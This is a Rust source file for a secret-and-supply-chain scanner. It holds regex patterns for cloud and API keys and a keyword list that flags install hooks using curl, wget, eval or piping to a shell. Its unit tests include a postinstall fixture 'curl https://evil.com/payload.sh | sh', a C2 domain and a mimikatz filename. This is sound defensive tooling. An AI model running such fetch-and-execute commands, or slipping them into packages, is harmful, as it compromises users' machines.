#[cfg(test)]
use crate::config::CustomPattern;
use crate::config::SandtraceConfig;
use crate::event::{AuditFinding, Severity};
use regex::Regex;
use std::path::Path;

/// Lines containing these markers are documentation samples, not real secrets.
/// Checked against the line text (excluding the matched token itself).
const REDACTION_MARKERS: &[&str] = &[
    // Explicit redaction
    "_redacted",
    "-redacted",
    "redacted_",
    "redacted-",
    // Example / documentation keys (e.g. AWS AKIAIOSFODNN7EXAMPLE)
    "example",
    // Documentation placeholders
    "placeholder",
    "your_token",
    "your-token",
    "your_key",
    "your-key",
    "your_secret",
    "your-secret",
    "your_password",
    "your-password",
    "changeme",
    "change_me",
    "change-me",
    "replace_me",
    "replace-me",
    "sample_token",
    "sample-token",
    "sample_key",
    "sample-key",
    "dummy_token",
    "dummy-token",
    "fake_token",
    "fake-token",
    // Placeholder/dummy values
    "your-api",
    "your_api",
    "your_access",
    "your-access",
    "your_bearer",
    "your-bearer",
    "key-xxxx",
    "xxxx",
    // Template variables (Helm, Jinja, env substitution)
    "{{ .",
    "{{.",
    "{{ $",
    "{{$",
    "${",
    "$(",
    "<%=",
    // Dynamic value lookups (not hardcoded)
    "config(",
    "env(",
    "getenv(",
    "process.env",
    "os.environ",
    "vault.",
    "ssm.",
    "secrets.",
    // Logging/debugging (showing truncated values, not hardcoding)
    "log::",
    "logger.",
    "console.log",
    "console.error",
    "console.warn",
    "console.debug",
    "this->error(",
    "this->info(",
    "str::take(",
    "substr(",
    // String concatenation (dynamic values, not hardcoded)
    "'.$",
    "\".$",
    "' .",
    "\" .",
];

struct ContentPattern {
    rule_id: &'static str,
    description: &'static str,
    severity: Severity,
    pattern: &'static str,
}

const CREDENTIAL_PATTERNS: &[ContentPattern] = &[
    ContentPattern {
        rule_id: "cred-aws-key",
        description: "AWS Access Key ID found in source",
        severity: Severity::Critical,
        pattern: r"(?i)AKIA[0-9A-Z]{16}",
    },
    ContentPattern {
        rule_id: "cred-private-key",
        description: "Private key found in source",
        severity: Severity::Critical,
        pattern: r"-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
    },
    ContentPattern {
        rule_id: "cred-jwt-token",
        description: "JWT token found in source",
        severity: Severity::High,
        pattern: r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
    },
    ContentPattern {
        rule_id: "cred-generic-password",
        description: "Hardcoded password assignment",
        severity: Severity::High,
        pattern: r#"(?i)(password|passwd|pwd)\s*[:=]\s*["'][^"']{8,}["']"#,
    },
    ContentPattern {
        rule_id: "cred-generic-secret",
        description: "Hardcoded secret/token assignment",
        severity: Severity::High,
        pattern: r#"(?i)(secret|token|api_key|apikey|auth_token)\s*[:=]\s*["'][^"']{8,}["']"#,
    },
    ContentPattern {
        rule_id: "cred-github-token",
        description: "GitHub personal access token found",
        severity: Severity::Critical,
        pattern: r"gh[pousr]_[A-Za-z0-9_]{36,}",
    },
    ContentPattern {
        rule_id: "cred-slack-token",
        description: "Slack token found in source",
        severity: Severity::Critical,
        pattern: r"xox[baprs]-[0-9a-zA-Z-]{10,}",
    },
    ContentPattern {
        rule_id: "cred-stripe-key",
        description: "Stripe API key found in source",
        severity: Severity::Critical,
        pattern: r"(sk|pk)_(test|live)_[0-9a-zA-Z]{24,}",
    },
    ContentPattern {
        rule_id: "cred-openai-key",
        description: "OpenAI API key found in source",
        severity: Severity::Critical,
        pattern: r"sk-proj-[A-Za-z0-9_-]{20,}",
    },
    ContentPattern {
        rule_id: "cred-anthropic-key",
        description: "Anthropic API key found in source",
        severity: Severity::Critical,
        pattern: r"sk-ant-api03-[A-Za-z0-9_-]{20,}",
    },
];

/// Patterns for .env files where values are unquoted (KEY=value format).
const ENV_FILE_PATTERNS: &[ContentPattern] = &[ContentPattern {
    rule_id: "cred-env-secret",
    description: "Secret/token/key in .env file",
    severity: Severity::High,
    pattern: r"(?im)^[A-Z_]*(SECRET|TOKEN|PASSWORD|PASSWD|KEY|AUTH)[A-Z_]*[ \t]*=[ \t]*\S{8,}",
}];

/// Check if a file is ignored by git (not tracked and matches .gitignore).
/// Returns false if not in a git repo or if git check fails.
fn is_git_ignored(path: &Path) -> bool {
    let abs_path = if path.is_absolute() {
        path.to_path_buf()
    } else {
        std::env::current_dir()
            .map(|d| d.join(path))
            .unwrap_or_else(|_| path.to_path_buf())
    };
    let dir = abs_path.parent().unwrap_or(Path::new("."));
    std::process::Command::new("git")
        .args(["check-ignore", "-q"])
        .arg(&abs_path)
        .current_dir(dir)
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

pub fn scan_file_content(
    path: &Path,
    config: &SandtraceConfig,
) -> Result<Vec<AuditFinding>, std::io::Error> {
    let content = std::fs::read_to_string(path)?;
    let file_path_str = path.to_string_lossy().to_string();
    let mut findings = Vec::new();

    let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("");

    // Skip files that are obviously test fixtures or examples
    if file_path_str.contains("/test")
        || file_path_str.contains("/fixture")
        || file_path_str.contains("/example")
    {
        return Ok(findings);
    }

    // Skip config files that are not secrets containers
    if file_name == ".claude.json" {
        return Ok(findings);
    }

    // Build the full pattern list: built-in + custom from config
    let lower_name = file_name.to_lowercase();
    let is_env_file = lower_name.starts_with(".env");

    // For .env files: skip git-ignored files entirely (local-only secrets, not a repo risk)
    if is_env_file && is_git_ignored(path) {
        return Ok(findings);
    }

    // .env.example and .env.testing are templates/test config — use built-in patterns
    // only (they may still contain real key formats like AWS keys), but skip env-specific
    // patterns that would flag placeholder values
    let use_env_patterns =
        is_env_file && !lower_name.ends_with(".example") && !lower_name.ends_with(".testing");

    let builtin_patterns = if use_env_patterns {
        CREDENTIAL_PATTERNS
            .iter()
            .chain(ENV_FILE_PATTERNS.iter())
            .collect::<Vec<_>>()
    } else {
        CREDENTIAL_PATTERNS.iter().collect::<Vec<_>>()
    };

    let mut all_patterns: Vec<ScanPattern> = builtin_patterns
        .iter()
        .map(|p| ScanPattern {
            rule_id: p.rule_id.to_string(),
            description: p.description.to_string(),
            severity: p.severity,
            pattern: p.pattern.to_string(),
        })
        .collect();

    // Separate custom patterns by match type
    let mut custom_literal_patterns = Vec::new();
    let mut custom_filename_patterns = Vec::new();

    for custom in &config.custom_patterns {
        let severity = parse_severity(&custom.severity);

        // Check file_extensions filter
        if !custom.file_extensions.is_empty() {
            let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
            if !custom
                .file_extensions
                .iter()
                .any(|e| e.eq_ignore_ascii_case(ext))
            {
                continue;
            }
        }

        match custom.match_type.as_str() {
            "literal" => {
                custom_literal_patterns.push((custom, severity));
            }
            "filename" => {
                custom_filename_patterns.push((custom, severity));
            }
            _ => {
                // Default: regex
                all_patterns.push(ScanPattern {
                    rule_id: custom.id.clone(),
                    description: custom.description.clone(),
                    severity,
                    pattern: custom.pattern.clone(),
                });
            }
        }
    }

    // Handle filename match patterns (match against path, not content)
    for (custom, severity) in &custom_filename_patterns {
        let file_path_lower = file_path_str.to_lowercase();
        let pattern_lower = custom.pattern.to_lowercase();
        if file_path_lower.contains(&pattern_lower) {
            findings.push(AuditFinding {
                file_path: file_path_str.clone(),
                line_number: None,
                rule_id: custom.id.clone(),
                severity: *severity,
                description: custom.description.clone(),
                matched_pattern: custom.pattern.clone(),
                context_lines: vec![format!("filename match: {}", file_path_str)],
            });
        }
    }

    // Handle literal match patterns (case-insensitive exact string search in content)
    let content_lower = content.to_lowercase();
    for (custom, severity) in &custom_literal_patterns {
        let pattern_lower = custom.pattern.to_lowercase();
        let mut search_start = 0;
        while let Some(pos) = content_lower[search_start..].find(&pattern_lower) {
            let abs_pos = search_start + pos;
            let line_number = content[..abs_pos].lines().count();

            // Check redaction markers
            let check_lines: Vec<&str> = content
                .lines()
                .skip(line_number.saturating_sub(2))
                .take(3)
                .collect();
            let context_text = check_lines.join(" ").to_lowercase();
            if config
                .redaction_markers
                .iter()
                .any(|m| context_text.contains(m))
            {
                search_start = abs_pos + pattern_lower.len();
                continue;
            }

            let lines: Vec<&str> = content.lines().collect();
            let start = line_number.saturating_sub(2);
            let end = (line_number + 1).min(lines.len());
            let context: Vec<String> = lines[start..end].iter().map(|l| l.to_string()).collect();

            findings.push(AuditFinding {
                file_path: file_path_str.clone(),
                line_number: Some(line_number),
                rule_id: custom.id.clone(),
                severity: *severity,
                description: custom.description.clone(),
                matched_pattern: custom.pattern.clone(),
                context_lines: context,
            });

            search_start = abs_pos + pattern_lower.len();
        }
    }

    let redaction_markers = &config.redaction_markers;

    // Handle regex patterns (built-in + custom regex)
    for pattern_def in &all_patterns {
        let regex = match Regex::new(&pattern_def.pattern) {
            Ok(r) => r,
            Err(_) => continue,
        };

        for mat in regex.find_iter(&content) {
            let line_number = content[..mat.start()].lines().count();

            // Skip matches where the matched content or surrounding lines contain redaction markers.
            // Check the line at the match position and adjacent lines to handle off-by-one.
            let check_lines: Vec<&str> = content
                .lines()
                .skip(line_number.saturating_sub(2))
                .take(3)
                .collect();
            let context_text = check_lines.join(" ").to_lowercase();
            if redaction_markers.iter().any(|m| context_text.contains(m)) {
                continue;
            }

            // Inline suppression: line above contains @sandtrace-ignore or sandtrace:ignore
            if line_number > 1 {
                if let Some(prev_line) = content.lines().nth(line_number.saturating_sub(2)) {
                    let prev_lower = prev_line.to_lowercase();
                    if prev_lower.contains("@sandtrace-ignore")
                        || prev_lower.contains("sandtrace:ignore")
                    {
                        continue;
                    }
                }
            }

            // Get context lines
            let lines: Vec<&str> = content.lines().collect();
            let start = line_number.saturating_sub(2);
            let end = (line_number + 1).min(lines.len());
            let context: Vec<String> = lines[start..end]
                .iter()
                .map(|l| {
                    // Redact the actual match in context
                    if l.contains(mat.as_str()) {
                        l.replace(mat.as_str(), "[REDACTED]")
                    } else {
                        l.to_string()
                    }
                })
                .collect();

            findings.push(AuditFinding {
                file_path: file_path_str.clone(),
                line_number: Some(line_number),
                rule_id: pattern_def.rule_id.clone(),
                severity: pattern_def.severity,
                description: pattern_def.description.clone(),
                matched_pattern: pattern_def.pattern.clone(),
                context_lines: context,
            });
        }
    }

    Ok(findings)
}

/// Runtime scan pattern (built-in or custom)
struct ScanPattern {
    rule_id: String,
    description: String,
    severity: Severity,
    pattern: String,
}

fn parse_severity(s: &str) -> Severity {
    match s.to_lowercase().as_str() {
        "critical" => Severity::Critical,
        "high" => Severity::High,
        "medium" => Severity::Medium,
        "low" => Severity::Low,
        _ => Severity::Medium,
    }
}

pub fn scan_supply_chain(dir: &Path) -> Vec<AuditFinding> {
    let mut findings = Vec::new();

    // Check for suspicious postinstall scripts in package.json files
    findings.extend(check_package_json_scripts(dir));

    findings
}

fn check_package_json_scripts(dir: &Path) -> Vec<AuditFinding> {
    let mut findings = Vec::new();

    let pkg_path = dir.join("package.json");
    if !pkg_path.exists() {
        return findings;
    }

    let content = match std::fs::read_to_string(&pkg_path) {
        Ok(c) => c,
        Err(_) => return findings,
    };

    let json: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(_) => return findings,
    };

    if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
        let suspicious_hooks = ["preinstall", "postinstall", "preuninstall", "postuninstall"];

        for hook in &suspicious_hooks {
            if let Some(script) = scripts.get(*hook).and_then(|v| v.as_str()) {
                // Flag scripts that download/execute external content
                let suspicious_patterns = [
                    "curl ", "wget ", "eval(", "node -e", "base64", "http://", "https://", "|sh",
                    "| sh", "|bash", "| bash",
                ];

                for pattern in &suspicious_patterns {
                    if script.contains(pattern) {
                        findings.push(AuditFinding {
                            file_path: pkg_path.to_string_lossy().to_string(),
                            line_number: None,
                            rule_id: "supply-chain-suspicious-script".to_string(),
                            severity: Severity::Critical,
                            description: format!(
                                "Suspicious '{}' script contains '{}': {}",
                                hook, pattern, script
                            ),
                            matched_pattern: pattern.to_string(),
                            context_lines: vec![format!("\"{}\": \"{}\"", hook, script)],
                        });
                    }
                }
            }
        }
    }

    findings
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;

    fn test_config() -> SandtraceConfig {
        SandtraceConfig::default()
    }

    #[test]
    fn test_detect_aws_key() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("config.js");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "const key = 'AKIAI44QH8DHBG5BREAL';").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "cred-aws-key");
    }

    #[test]
    fn test_skip_aws_example_key() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("config.js");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "const key = 'AKIAIOSFODNN7EXAMPLE';").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(
            findings.is_empty(),
            "EXAMPLE keys should be skipped by redaction markers"
        );
    }

    #[test]
    fn test_detect_private_key() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("deploy.sh");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "-----BEGIN RSA PRIVATE KEY-----").unwrap();
        writeln!(file, "MIIBogIBAAJBALRiMLAHudeSA/x3hB2f+2NRkJyBIZ").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "cred-private-key");
    }

    #[test]
    fn test_custom_pattern() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("app.rs");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(
            file,
            "let key = \"INTERNAL_ABCDEF0123456789ABCDEF0123456789\";"
        )
        .unwrap();

        let mut config = test_config();
        config.custom_patterns.push(CustomPattern {
            id: "cred-internal-api".to_string(),
            description: "Internal API key found".to_string(),
            severity: "high".to_string(),
            pattern: "INTERNAL_[A-Z0-9]{32}".to_string(),
            match_type: "regex".to_string(),
            file_extensions: Vec::new(),
            tags: Vec::new(),
        });

        let findings = scan_file_content(&file_path, &config).unwrap();
        assert!(findings.iter().any(|f| f.rule_id == "cred-internal-api"));
    }

    #[test]
    fn test_custom_redaction_marker() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("config.js");
        let mut file = std::fs::File::create(&file_path).unwrap();
        // This line has a real-looking AWS key but also a custom redaction marker
        writeln!(
            file,
            "const key = 'AKIAI44QH8DHBG5BREAL'; // test_fixture_value"
        )
        .unwrap();

        let mut config = test_config();
        config
            .redaction_markers
            .push("test_fixture_value".to_string());

        let findings = scan_file_content(&file_path, &config).unwrap();
        assert!(findings.is_empty());
    }

    #[test]
    fn test_suspicious_postinstall() {
        let dir = tempfile::tempdir().unwrap();
        let pkg_path = dir.path().join("package.json");
        let mut file = std::fs::File::create(&pkg_path).unwrap();
        writeln!(
            file,
            r#"{{"scripts": {{"postinstall": "curl https://evil.com/payload.sh | sh"}}}}"#
        )
        .unwrap();

        let findings = check_package_json_scripts(dir.path());
        assert!(!findings.is_empty());
        assert_eq!(findings[0].rule_id, "supply-chain-suspicious-script");
    }

    #[test]
    fn test_literal_match_type() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("app.rs");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "let domain = \"malware-c2.evil.com\";").unwrap();

        let mut config = test_config();
        config.custom_patterns.push(CustomPattern {
            id: "ioc-c2-domain".to_string(),
            description: "Known C2 domain".to_string(),
            severity: "critical".to_string(),
            pattern: "malware-c2.evil.com".to_string(),
            match_type: "literal".to_string(),
            file_extensions: Vec::new(),
            tags: vec!["ioc".to_string(), "c2".to_string()],
        });

        let findings = scan_file_content(&file_path, &config).unwrap();
        assert!(findings.iter().any(|f| f.rule_id == "ioc-c2-domain"));
    }

    #[test]
    fn test_literal_match_case_insensitive() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("app.rs");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "let hash = \"ABCDEF1234567890\";").unwrap();

        let mut config = test_config();
        config.custom_patterns.push(CustomPattern {
            id: "ioc-hash".to_string(),
            description: "Known hash".to_string(),
            severity: "critical".to_string(),
            pattern: "abcdef1234567890".to_string(),
            match_type: "literal".to_string(),
            file_extensions: Vec::new(),
            tags: vec!["ioc".to_string()],
        });

        let findings = scan_file_content(&file_path, &config).unwrap();
        assert!(findings.iter().any(|f| f.rule_id == "ioc-hash"));
    }

    #[test]
    fn test_filename_match_type() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("mimikatz.ps1");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "Write-Host 'hello'").unwrap();

        let mut config = test_config();
        config.custom_patterns.push(CustomPattern {
            id: "ioc-suspicious-file".to_string(),
            description: "Known malicious filename".to_string(),
            severity: "high".to_string(),
            pattern: "mimikatz".to_string(),
            match_type: "filename".to_string(),
            file_extensions: vec!["ps1".to_string()],
            tags: vec!["ioc".to_string(), "tool".to_string()],
        });

        let findings = scan_file_content(&file_path, &config).unwrap();
        assert!(findings.iter().any(|f| f.rule_id == "ioc-suspicious-file"));
    }

    #[test]
    fn test_file_extensions_filter() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("app.txt");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "malware-c2.evil.com").unwrap();

        let mut config = test_config();
        config.custom_patterns.push(CustomPattern {
            id: "ioc-c2-domain".to_string(),
            description: "Known C2 domain".to_string(),
            severity: "critical".to_string(),
            pattern: "malware-c2.evil.com".to_string(),
            match_type: "literal".to_string(),
            file_extensions: vec!["rs".to_string(), "js".to_string()],
            tags: vec!["ioc".to_string()],
        });

        // .txt file should be skipped because file_extensions only includes rs and js
        let findings = scan_file_content(&file_path, &config).unwrap();
        assert!(!findings.iter().any(|f| f.rule_id == "ioc-c2-domain"));
    }

    #[test]
    fn test_skip_console_error_password_reference() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("settings.js");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "try {{").unwrap();
        writeln!(file, "    await updatePassword(newPwd);").unwrap();
        writeln!(file, "}} catch (error) {{").unwrap();
        writeln!(
            file,
            "    console.error('Failed to update password:', error);"
        )
        .unwrap();
        writeln!(file, "    throw error;").unwrap();
        writeln!(file, "}}").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(
            !findings
                .iter()
                .any(|f| f.rule_id == "cred-generic-password"),
            "console.error password references should be skipped as false positives"
        );
    }

    #[test]
    fn test_skip_console_warn_secret_reference() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("auth.js");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(
            file,
            "console.warn('Invalid secret token:', 'check configuration');"
        )
        .unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(
            !findings.iter().any(|f| f.rule_id == "cred-generic-secret"),
            "console.warn secret references should be skipped as false positives"
        );
    }

    #[test]
    fn test_detect_credentials_in_env_file() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join(".env");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "AWS_ACCESS_KEY_ID=AKIAI44QH8DHBG5BREAL").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(
            findings.iter().any(|f| f.rule_id == "cred-aws-key"),
            ".env files should be scanned for credentials"
        );
    }

    #[test]
    fn test_detect_credentials_in_env_production() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join(".env.production");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "-----BEGIN RSA PRIVATE KEY-----").unwrap();
        writeln!(file, "MIIBogIBAAJBALRiMLAHudeSA/x3hB2f+2NRkJyBIZ").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(
            findings.iter().any(|f| f.rule_id == "cred-private-key"),
            ".env.production files should be scanned for credentials"
        );
    }

    #[test]
    fn test_detect_credentials_in_env_local() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join(".env.local");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "-----BEGIN RSA PRIVATE KEY-----").unwrap();
        writeln!(file, "MIIBogIBAAJBALRiMLAHudeSA/x3hB2f+2NRkJyBIZ").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(
            findings.iter().any(|f| f.rule_id == "cred-private-key"),
            ".env.local files should be scanned for credentials"
        );
    }

    #[test]
    fn test_detect_unquoted_env_secret() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join(".env.production");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "VITE_GIPHY_API_KEY=abc123def456ghi789").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(
            findings.iter().any(|f| f.rule_id == "cred-env-secret"),
            ".env files should detect unquoted secret/key/token values"
        );
    }

    #[test]
    fn test_unquoted_token_not_flagged_in_source_code() {
        let dir = tempfile::tempdir().unwrap();
        let file_path = dir.path().join("auth.ts");
        let mut file = std::fs::File::create(&file_path).unwrap();
        writeln!(file, "const accessToken = response.accessToken;").unwrap();

        let findings = scan_file_content(&file_path, &test_config()).unwrap();
        assert!(
            !findings.iter().any(|f| f.rule_id == "cred-env-secret"),
            "Unquoted token references in source code should not trigger env-specific patterns"
        );
    }
}
